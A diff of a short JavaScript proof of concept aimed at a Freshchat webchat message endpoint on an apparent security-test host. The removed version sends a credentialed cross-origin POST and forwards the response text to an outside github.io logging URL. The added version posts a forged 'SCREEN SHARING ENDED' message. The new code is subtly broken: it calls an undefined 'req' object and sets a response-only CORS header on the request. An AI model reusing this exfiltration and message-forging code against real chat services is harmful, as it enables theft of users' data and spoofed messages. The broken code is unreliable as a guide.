@@ -1,15 +1,22 @@
-<html>
-  <body>
-    <script> 
-       var req = new XMLHttpRequest(); 
-req.onload = reqListener; 
-req.open('post','https://sectestfreshchat.freshpori.com/app/services/app/webchat/1d473109-052b-48c2-801d-d997f143f293/user/9edfe260-4ce1-4b74-8b3a-808db6628f12/message?widgetInfoTraceId=97acf0b6-17b5-44dc-8865-fe3b993c5145',true); 
-req.withCredentials = true;
-req.send();
-
-function reqListener() {
-    location='//hemar0605.github.io/testfrshcht/log?key='+this.responseText; 
-   };
- </script>
-  </body>
-</html>
+var xhr = new XMLHttpRequest();
+req.open('POST','https://sectestfreshchat.freshpori.com/app/services/app/webchat/1d473109-052b-48c2-801d-d997f143f293/user/9edfe260-4ce1-4b74-8b3a-808db6628f12/message?widgetInfoTraceId=97acf0b6-17b5-44dc-8865-fe3b993c5145',true);
+xhr.setRequestHeader('Content-Type', 'application/json');
+xhr.setRequestHeader('Access-Control-Allow-Origin', 'https://hemar0605.github.io/testfrshcht/'); // Replace * with the appropriate origin
+xhr.responseType = 'json';
+xhr.onload = function() {
+  if (xhr.status === 200) {
+   var responseJSON = xhr.response;
+   console.log(responseJSON);
+  } else {
+    console.error('Request failed. Status:', xhr.status);
+  }
+};
+var jsonData = {
+  "msgHopId":"1684313315959_1684312406980","messageType":8005,"messageUserType":0,"channelId":"558396","createdMillis":1684313315959,"cobrowsingId":null,"messageFragments":[{"fragmentType":1,"contentType":"text/html","content":"SCREEN SHARING ENDED"}]
+}; 
+var jsonString = JSON.stringify(jsonData);
+xhr.send(jsonString);
+function displayResponse(responseJSON) {
+var responseElement = document.getElementById('response');
+  responseElement.innerText = JSON.stringify(responseJSON);
+}
